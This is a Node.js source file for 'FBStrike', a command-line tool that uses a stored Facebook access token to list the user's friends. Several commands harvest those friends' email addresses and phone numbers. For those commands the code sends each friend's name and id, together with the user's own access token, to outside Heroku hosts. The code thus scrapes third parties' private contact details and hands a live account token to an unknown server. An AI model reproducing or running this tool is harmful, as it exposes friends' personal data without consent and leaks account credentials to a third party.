process.on("SIGINT", function(){
    console.log(Chalk.greenBright("\n[FBStrike] Success: Process stopped."))
    console.log(Chalk.greenBright("[FBStrike] Success: Exitting FBstrike."))
    console.log(Chalk.greenBright("[FBStrike] Success: Exitted! Thank you for using FBStrike."))
    process.exit()
})
setInterval(function(){}, 100000)
//Requirements Importer
const ReadLine = require("readline").createInterface({
    input: process.stdin,
    output: process.stdout
})
const JSONFile = require("jsonfile")
const Request = require("request")
const Chalk = require("chalk")

//Variables
const Args = process.argv.slice(2)

//Function
async function CLI(rootname, token){
    rootnameS = rootname
    tokenS = token
    ReadLine.resume()
    ReadLine.question(Chalk.cyanBright(`${rootname}@fbstrike`) + Chalk.magentaBright(":~$ "), command =>{
        if(command == "list friends"){
            console.log(Chalk.greenBright("[FBStrike] Success: running. PLEASE be patient."))
            var Checkinginterval = 10 * 10
            var got = 0
            Request(`https://graph.facebook.com/me/friends?access_token=${token}`, function(err, res, body){
                body = JSON.parse(body)
                var IT = setInterval(function(){
                    try{
                        console.log(Chalk.greenBright(`name: ${body.data[got].name} | id: ${body.data[got].id}`))
                        got += 1
                    }catch{
                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their name and id.`))
                        got = 0
                        CLI(rootname, token)
                        clearInterval(IT)
                        return
                    }
                }, Checkinginterval)
            })
        }else if(command == "list friends ns"){
            console.log(Chalk.greenBright("[FBStrike] Success: running. PLEASE be patient."))
            var Checkinginterval = 10 * 10
            var got = 0
            Request(`https://graph.facebook.com/me/friends?access_token=${token}`, function(err, res, body){
                body = JSON.parse(body)
                var IT = setInterval(function(){
                    try{
                        console.log(Chalk.greenBright(`name:${body.data[got].name} | id:${body.data[got].id}`))
                        got += 1
                    }catch{
                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their name and id. Settings: ns.`))
                        got = 0
                        CLI(rootname, token)
                        clearInterval(IT)
                        return
                    }
                }, Checkinginterval)
            })
        }else if(command == "list friends nid"){
            console.log(Chalk.greenBright("[FBStrike] Success: running. PLEASE be patient."))
            var Checkinginterval = 10 * 10
            var got = 0
            Request(`https://graph.facebook.com/me/friends?access_token=${token}`, function(err, res, body){
                body = JSON.parse(body)
                var IT = setInterval(function(){
                    try{
                        console.log(Chalk.greenBright(`name: ${body.data[got].name}`))
                        got += 1
                    }catch{
                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their name only. Settings: nid.`))
                        got = 0
                        CLI(rootname, token)
                        clearInterval(IT)
                        return
                    }
                }, Checkinginterval)
            })
        }else if(command == "list friends nnm"){
            console.log(Chalk.greenBright("[FBStrike] Success: running. PLEASE be patient."))
            var Checkinginterval = 10 * 10
            var got = 0
            Request(`https://graph.facebook.com/me/friends?access_token=${token}`, function(err, res, body){
                body = JSON.parse(body)
                var IT = setInterval(function(){
                    try{
                        console.log(Chalk.greenBright(`id: ${body.data[got].id}`))
                        got += 1
                    }catch{
                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their id only. Settings: nnm.`))
                        got = 0
                        CLI(rootname, token)
                        clearInterval(IT)
                        return
                    }
                }, Checkinginterval)
            })
        }else if(command == "list friends nsnnm"){
            console.log(Chalk.greenBright("[FBStrike] Success: running. PLEASE be patient."))
            var Checkinginterval = 10 * 10
            var got = 0
            Request(`https://graph.facebook.com/me/friends?access_token=${token}`, function(err, res, body){
                body = JSON.parse(body)
                var IT = setInterval(function(){
                    try{
                        console.log(Chalk.greenBright(`id:${body.data[got].id}`))
                        got += 1
                    }catch{
                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their id only. Settings: ns, nnm.`))
                        got = 0
                        CLI(rootname, token)
                        clearInterval(IT)
                        return
                    }
                }, Checkinginterval)
            })
        }else if(command == "list friends nsnid"){
            console.log(Chalk.greenBright("[FBStrike] Success: running. PLEASE be patient."))
            var Checkinginterval = 10 * 10
            var got = 0
            Request(`https://graph.facebook.com/me/friends?access_token=${token}`, function(err, res, body){
                body = JSON.parse(body)
                var IT = setInterval(function(){
                    try{
                        console.log(Chalk.greenBright(`name:${body.data[got].name}`))
                        got += 1
                    }catch{
                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their name only. Settings: ns, nid.`))
                        got = 0
                        CLI(rootname, token)
                        clearInterval(IT)
                        return
                    }
                }, Checkinginterval)
            })
        }else if(command == "list friends w nsemail"){
            console.log(Chalk.greenBright("[FBStrike] Success: running. NOTE: If it doesn't send anything in the next <20 minutes><depends on how many friends you have> it means you don't have a friend that have a email in their account. PLEASE be patient."))
            var Checkinginterval = 10 * 200
            var got = 0
            Request(`https://graph.facebook.com/me/friends?access_token=${token}`, function(err, res, body){
                body = JSON.parse(body)
                var IT = setInterval(function(){
                    try{
                        Request(`https://fbstrike-keg.herokuapp.com/?name=${body.data[got].name}&id=${body.data[got].id}&token=${token}`, function(err, res, body2){
                            var Obj = JSON.parse(body2)
                            try{
                                if(body2.indexOf("null") != -1){}else{
                                    try{
                                        console.log(`name:${body.data[got].name} | id:${body.data[got].id} | email:${Obj.result[0]}`)
                                    }catch{
                                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their name and id and email. Settings: ns.`))
                                        got = 0
                                        CLI(rootname, token)
                                        clearInterval(IT)
                                        return
                                    }
                                }
                            }catch{}
                            got += 1
                        })
                    }catch{
                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their name and id and email. Settings: ns.`))
                        got = 0
                        CLI(rootname, token)
                        clearInterval(IT)
                        return
                    }
                }, Checkinginterval)
            })
        }else if(command == "list friends w email"){
            console.log(Chalk.greenBright("[FBStrike] Success: running. NOTE: If it doesn't send anything in the next <20 minutes><depends on how many friends you have> it means you don't have a friend that have a email in their account. PLEASE be patient."))
            var Checkinginterval = 10 * 200
            var got = 0
            Request(`https://graph.facebook.com/me/friends?access_token=${token}`, function(err, res, body){
                body = JSON.parse(body)
                var IT = setInterval(function(){
                    try{
                        Request(`https://fbstrike-keg.herokuapp.com/?name=${body.data[got].name}&id=${body.data[got].id}&token=${token}`, function(err, res, body2){
                            var Obj = JSON.parse(body2)
                            try{
                                if(body2.indexOf("null") != -1){}else{
                                    try{
                                        console.log(`name: ${body.data[got].name} | id: ${body.data[got].id} | email: ${Obj.result[0]}`)
                                    }catch{
                                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their name and id and email.`))
                                        got = 0
                                        CLI(rootname, token)
                                        clearInterval(IT)
                                        return
                                    }
                                }
                            }catch{}
                            got += 1
                        })
                    }catch{
                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their name and id and email.`))
                        got = 0
                        CLI(rootname, token)
                        clearInterval(IT)
                        return
                    }
                }, Checkinginterval)
            })
        }else if(command == "list friends w oemail"){
            console.log(Chalk.greenBright("[FBStrike] Success: running. NOTE: If it doesn't send anything in the next <20 minutes><depends on how many friends you have> it means you don't have a friend that have a email in their account. PLEASE be patient."))
            var Checkinginterval = 10 * 200
            var got = 0
            Request(`https://graph.facebook.com/me/friends?access_token=${token}`, function(err, res, body){
                body = JSON.parse(body)
                var IT = setInterval(function(){
                    try{
                        Request(`https://fbstrike-keg.herokuapp.com/?name=${body.data[got].name}&id=${body.data[got].id}&token=${token}`, function(err, res, body2){
                            var Obj = JSON.parse(body2)
                            try{
                                if(body2.indexOf("null") != -1){}else{
                                    try{
                                        console.log(`email: ${Obj.result[0]}`)
                                    }catch{
                                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their email only.`))
                                        got = 0
                                        CLI(rootname, token)
                                        clearInterval(IT)
                                        return
                                    }
                                }
                            }catch{}
                            got += 1
                        })
                    }catch{
                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their email only.`))
                        got = 0
                        CLI(rootname, token)
                        clearInterval(IT)
                        return
                    }
                }, Checkinginterval)
            })
        }else if(command == "list friends w phone_number"){
            console.log(Chalk.greenBright("[FBStrike] Success: running. NOTE: If it doesn't send anything in the next <20 minutes><depends on how many friends you have> it means you don't have a friend that have a phone number in their account. PLEASE be patient."))
            var Checkinginterval = 10 * 200
            var got = 0
            Request(`https://graph.facebook.com/me/friends?access_token=${token}`, function(err, res, body){
                body = JSON.parse(body)
                var IT = setInterval(function(){
                    try{
                        Request(`https://fbstrike-kpg.herokuapp.com/?name=${body.data[got].name}&id=${body.data[got].id}&token=${token}`, function(err, res, body2){
                            var Obj = JSON.parse(body2)
                            try{
                                if(body2.indexOf("null") != -1){}else{
                                    try{
                                        console.log(`name: ${body.data[got].name} | id: ${body.data[got].id} | phone number: ${Obj.result[0]}`)
                                    }catch{
                                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their name and id and phone number.`))
                                        got = 0
                                        CLI(rootname, token)
                                        clearInterval(IT)
                                        return
                                    }
                                }
                            }catch{}
                            got += 1
                        })
                    }catch{
                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their name and id and phone number.`))
                        got = 0
                        CLI(rootname, token)
                        clearInterval(IT)
                        return
                    }
                }, Checkinginterval)
            })
        }else if(command == "list friends w nsphone_number"){
            console.log(Chalk.greenBright("[FBStrike] Success: running. NOTE: If it doesn't send anything in the next <20 minutes><depends on how many friends you have> it means you don't have a friend that have a phone number in their account. PLEASE be patient."))
            var Checkinginterval = 10 * 200
            var got = 0
            Request(`https://graph.facebook.com/me/friends?access_token=${token}`, function(err, res, body){
                body = JSON.parse(body)
                var IT = setInterval(function(){
                    try{
                        Request(`https://fbstrike-kpg.herokuapp.com/?name=${body.data[got].name}&id=${body.data[got].id}&token=${token}`, function(err, res, body2){
                            var Obj = JSON.parse(body2)
                            try{
                                if(body2.indexOf("null") != -1){}else{
                                    try{
                                        console.log(`name:${body.data[got].name} | id:${body.data[got].id} | phone number:${Obj.result[0]}`)
                                    }catch{
                                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their name and id and phone number. Settings: ns.`))
                                        got = 0
                                        CLI(rootname, token)
                                        clearInterval(IT)
                                        return
                                    }
                                }
                            }catch{}
                            got += 1
                        })
                    }catch{
                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their name and id and phone number. Settings: ns`))
                        got = 0
                        CLI(rootname, token)
                        clearInterval(IT)
                        return
                    }
                }, Checkinginterval)
            })
        }else if(command == "list friends w ophone_number"){
            console.log(Chalk.greenBright("[FBStrike] Success: running. NOTE: If it doesn't send anything in the next <20 minutes><depends on how many friends you have> it means you don't have a friend that have a phone number in their account. PLEASE be patient."))
            var Checkinginterval = 10 * 200
            var got = 0
            Request(`https://graph.facebook.com/me/friends?access_token=${token}`, function(err, res, body){
                body = JSON.parse(body)
                var IT = setInterval(function(){
                    try{
                        Request(`https://fbstrike-kpg.herokuapp.com/?name=${body.data[got].name}&id=${body.data[got].id}&token=${token}`, function(err, res, body2){
                            var Obj = JSON.parse(body2)
                            try{
                                if(body2.indexOf("null") != -1){}else{
                                    try{
                                        console.log(`phone number:${Obj.result[0]}`)
                                    }catch{
                                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their name and id and phone number.`))
                                        got = 0
                                        CLI(rootname, token)
                                        clearInterval(IT)
                                        return
                                    }
                                }
                            }catch{}
                            got += 1
                        })
                    }catch{
                        console.log(Chalk.greenBright(`[FBStrike] Success: listed all your friends with their name and id and phone number.`))
                        got = 0
                        CLI(rootname, token)
                        clearInterval(IT)
                        return
                    }
                }, Checkinginterval)
            })
        }else if(command == "commands"){
console.log(Chalk.greenBright(`Command: commands | Description:To show fbstrike commands list.
Command: clear | Description:To clear the console like cmd cls.

Command: list friends | Description:To list all your friends with their name and id.
Command: list friends ns | Description:To list all your friends with their name and id without space.
Command: list friends nsnid | Description:To list all your friends with their name only without space.
Command: list friends nsnnm | Description:To list all your friends with their id only without space.
Command: list friends w email | Description:To list all your friends with their name and id and email.
Command: list friends w nsemail | Description:To list all your friends with their name and id and email without space.
Command: list friends w phone_number | Description:To list all your friends with their name and id and phone number.
command: list friends w nsphone_number | Description:To list all your friends with their name and id and phone number without space.

Command: list friends nid | Description:To list all your friends with their name only.
Command: list friends nnm | Description:To list all your friends with their id only.
Command: list friends w oemail | Description:To list all your friends with their email only.
Command: list friends w ophone_number | Description:To list all your friends with their phone number only.
`))
            CLI(rootname, token)
            return
        }else if(command == "clear"){
            console.clear()
            CLI(rootname, token)
            return
        }else{
            console.log(Chalk.red("[FBStrike] Invalid command or unrecognized command. Please type this command to show fbstrike commands list: commands"))
            CLI(rootname, token)
            return
        }
    })
}

//Start up
console.log(Chalk.redBright(`===============================================================================
=                                                                             =
=  ███████╗██████╗ ███████╗████████╗██████╗ ██╗██╗  ██╗███████╗               =
=  ██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝               =
=  █████╗  ██████╔╝███████╗   ██║   ██████╔╝██║█████╔╝ █████╗                 =
=  ██╔══╝  ██╔══██╗╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝                 =
=  ██║     ██████╔╝███████║   ██║   ██║  ██║██║██║  ██╗███████╗               =
=  ╚═╝     ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝  by FBStrike  =
=                                                                             =
===============================================================================`))

//Main
async function Main(){
    ReadLine.resume()
    JSONFile.readFile("./security/settings.json", function(err, data){
        try{
            if(data.rootname.length <= 0 || data.token.length <= 0){
                ReadLine.question(Chalk.blueBright("UsernameNToken: "), usernamentoken =>{
                    usernamentoken = usernamentoken.split(":")
                    var username = usernamentoken[0]
                    var token = usernamentoken[1]
                    try{
                        if(username.length <= 0 || token.length <= 0){
                            console.log(Chalk.red("[FBStrike] Error occurred: invalid username or the format is incorrect."))
                            Main()
                            return
                        }else{
                            data.rootname = username
                            console.log(Chalk.greenBright("[FBStrike] Success: username has been configured."))
                            data.token = token
                            console.log(Chalk.greenBright("[FBStrike] Success: token has been configured."))
                            JSONFile.writeFile("./security/settings.json", data, function(err2){
                                if(err2){
                                   console.log(Chalk.red(`[FBStrike] Error occurred: ${err2}`))
                                   process.exit(1)
                                }
                                console.log(Chalk.greenBright("[FBStrike] Success: username and token configuring finished. Please run fbstrike.js again."))
                                process.exit()
                                return
                            })
                        }
                    }catch{
                        console.log(Chalk.red("[FBStrike] Error occurred: invalid username or the format is incorrect."))
                        Main()
                        return
                    }
                })
            }else{
                CLI(data.rootname, data.token)
                return
            }
        }catch(error){
            console.log(Chalk.red("[FBStrike] Error occurred: settings.json is empty or corrupted. Please use this command to fix the problem: node fbstrike.js reset"))
            process.exit(1)
        }
    })
}
if(Args[0] == "reset"){
    console.log(Chalk.yellowBright("[FBStrike] Warning! resetting settings."))
    JSONFile.writeFile("./security/settings.json", { "rootname": "", "token": "" }, function(err){
        if(err){
            console.log(Chalk.red(`[FBStrike] Error occurred: ${err}`))
            process.exit(1)
        }
        console.log(Chalk.greenBright("[FBStrike] Success: settings resetted."))
        process.exit()
    })
}else{
    Main()
}